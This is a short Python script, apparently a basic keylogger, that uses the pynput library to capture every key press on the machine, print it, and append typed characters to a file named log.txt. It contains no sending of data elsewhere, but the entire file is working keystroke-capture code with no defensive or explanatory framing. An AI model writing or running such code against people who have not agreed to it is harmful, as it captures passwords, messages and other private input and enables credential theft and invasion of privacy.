from pynput import keyboard


def KeyPressed(key):
    print(str(key))
    with open("log.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)

        except:
            print("Error ...")

if __name__ == "__main__":
    lis = keyboard.Listener(on_press=KeyPressed)
    lis.start()
    input()        
